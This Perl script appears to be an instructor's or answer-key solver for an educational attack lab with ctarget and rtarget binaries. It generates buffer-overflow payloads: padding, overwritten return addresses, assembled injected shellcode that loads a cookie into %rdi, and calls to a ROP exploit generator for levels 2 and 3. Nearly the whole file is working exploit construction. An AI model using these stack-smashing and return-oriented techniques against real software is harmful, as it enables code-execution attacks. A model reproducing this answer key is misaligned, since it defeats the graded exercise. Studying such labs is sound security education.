#!/usr/bin/perl
#######################################################################
# solver.pl - Universal target solver
#######################################################################
# 
# Assumes that solution information available in same directory as ctarget and rtarget
#

use Getopt::Std;

# Important parameters
$cookie = 0;
$offset = 0;
$stack = 0;
$touch1 = 0;
$touch2 = 0;
$touch3 = 0;


getopts('hrl:t:d:s:');

if ($opt_h) {
    printf STDERR "Usage: $0 [-hr] -l LVL -t ID [-d DIR] [-s DIR]\n";
    printf STDERR "  -r        Use ROP attack on rtarget\n";
    printf STDERR "  -l LVL    Specify level (1-3)\n";
    printf STDERR "  -t ID     Specify target ID\n";
    printf STDERR "  -d DIR    Specify directory of target\n";
    printf STDERR "  -s DIR    Specify solve directory\n";
    exit(0);
}

if ($opt_r) {
    $is_rop = 1;
} else {
    $is_rop = 0;
}

if ($opt_l) {
    $level = $opt_l;
} else {
    printf STDERR "Must specify level\n";
    exit(1);
}

if ($opt_t) {
    $id = $opt_t;
} else {
    printf STDERR "Must specify target ID\n";
    exit(1);
}

if ($opt_d) {
    $targetdir = $opt_d;
} else {
    $targetdir = "../../targets/target$id";
}

if ($opt_s) {
    $solvedir = $opt_s;
} else {
    $solvedir = ".";
}


# Procedures to read files

# Read cookie.txt
sub read_cookie {
    $infile = "$targetdir/cookie.txt";
    open (IN, $infile) || die "Couldn't open input file '$infile'\n";
    while (<IN>) {
	$line = $_;
	chomp $line;
	$cookie = hex($line);
    }
    close IN;
}

# Read rtarget.b or ctarget.b
sub read_touch {
    ($prefix) = @_;
    $suffix = "target.b";
    $infile = "$targetdir/$prefix$suffix";
    open (IN, $infile) || die "Couldn't open input file '$infile'\n";
    while (<IN>) {
	$line = $_;
	chomp $line;
	@fields = split ":", $line;
	$addr = hex($fields[1]);
	if ($fields[0] eq "touch1") {
	    $touch1 = $addr;
	}
	if ($fields[0] eq "touch2") {
	    $touch2 = $addr;
	}
	if ($fields[0] eq "touch3") {
	    $touch3 = $addr;
	}
    }
    close IN;
}

# Read addresses.txt
sub read_addresses {
    $infile = "$targetdir/addresses.txt";
    open (IN, $infile) || die "Couldn't open input file '$infile'\n";
    while (<IN>) {
	$line = $_;
	chomp $line;
	@fields = split ":", $line;
	if ($fields[0] eq "stack") {
	    $stack = hex($fields[1]);
	}
	if ($fields[0] eq "offset") {
	    $offset = $fields[1];
	}
    }
    close IN;
}

# Print byte string
sub print_comment {
    ($line) = @_;
    print "/* $line */\n";
}

sub print_bytes {
    @bytes = @_;
    for $b (@bytes) {
	printf ("%.2x ", $b);
    }
    print "\n";
}

sub repeat_byte {
    ($bval, $cnt) = @_;
    for ($i = 0; $i < $cnt; $i += 1) {
	printf ("%.2x ", $bval);
    }
    print "\n";    
}

sub print_qword {
    ($val) = @_;
    @bytes = (0, 0, 0, 0, 0, 0, 0, 0);
    for ($i = 0; $i < 8; $i += 1) {
	@bytes[$i] = $val & 0xFF;
	$val = $val >> 8;
    }
    &print_bytes(@bytes);
}

# Generate byte representation of string
sub print_string {
    ($s) = @_;
    @chars = split("", $s);
    @bytes = ();
    $i = 0;
    for $b (@chars) {
	$bytes[$i] = ord($b);
	$i += 1;
    }
    $bytes[$i] = 0;
    print_bytes(@bytes);
}

# Generate shell code for ASM string
sub shell_code {
    ($line) = @_;
    open OUT, ">shellcode.s";
    print OUT "$line\n";
    close OUT;
    system "as shellcode.s -o shellcode.o" || die "Couldn't assemble file shellcode.s\n";
    system "objdump -d shellcode.o > shellcode.d" || die "Couldn't disassemble shellcode.o\n";
    $bstring = `$solvedir/readd.pl -a < shellcode.d` || die "Couldn't read bytes for shellcode.d\n";
    system "rm -f shellcode.s shellcode.o shellcode.d";
    @sbytes = split " ", $bstring;
    @bytes = ();
    for ($i = 0; $i < scalar(@sbytes); $i += 1) {
	if (!($sbytes[$i] eq "")) {
	    $b = hex($sbytes[$i]);
	    $bytes[$i] = $b;
	}
    }
    return @bytes;
}
    
if ($level == 1) {
    if ($is_rop) {
	&read_touch("r");
    } else {
	&read_touch("c");
    }
    &read_addresses();
    &print_comment("Pad with $offset bytes");
    &repeat_byte(0x0, $offset);
    &print_comment("Address of touch1");
    &print_qword($touch1);
}

if ($level == 2) {
    &read_cookie();
    &read_addresses();
    $hcookie = sprintf("%x", $cookie);
    if ($is_rop) {
	&read_touch("r");
	$htouch = sprintf("%x", $touch2);
	system "$solvedir/exploit -2 -c $hcookie -p $offset -t $htouch -i $targetdir/rtarget.g"
	    || die "Couldn't generate exploit\n";
    } else {
	&read_touch("c");
	# Generate shell code
	$shellstring = "movq \$0x$hcookie,%rdi; ret";
	@bytes = &shell_code("\t$shellstring");
	&print_comment("Byte code for shell code '$shellstring'");
	&print_bytes(@bytes);
	$padcnt = $offset - scalar(@bytes);
	&print_comment("Pad with $padcnt bytes");
	&repeat_byte(0x0, $padcnt);
	&print_comment("Address of shellcode");
	&print_qword($stack);
	&print_comment("Address of touch2");
	&print_qword($touch2);
    }
}

if ($level == 3) {
    &read_cookie();
    &read_addresses();
    $hcookie = sprintf("%x", $cookie);
    if ($is_rop) {
	&read_touch("r");
	$htouch = sprintf("%x", $touch3);
	system "$solvedir/exploit -3 -c $hcookie -p $offset -t $htouch -i $targetdir/rtarget.g" || die "Couldn't generate exploit\n";
    } else {
	&read_touch("c");
	# Will position string beyond shell code and return addresses
	$spos = sprintf("%x", $stack + $offset + 16);
	# Generate shell code
	$shellstring = "movq \$0x$spos,%rdi; ret";
	@bytes = &shell_code("\t$shellstring");
	&print_comment("Byte code for shell code '$shellstring'");
	&print_bytes(@bytes);
	$padcnt = $offset - scalar(@bytes);
	&print_comment("Pad with $padcnt bytes");
	&repeat_byte(0x0, $padcnt);
	&print_comment("Address of shellcode");
	&print_qword($stack);
	&print_comment("Address of touch3");
	&print_qword($touch3);
	&print_comment("String representation of 0x$hcookie");
	&print_string($hcookie);
    }
}
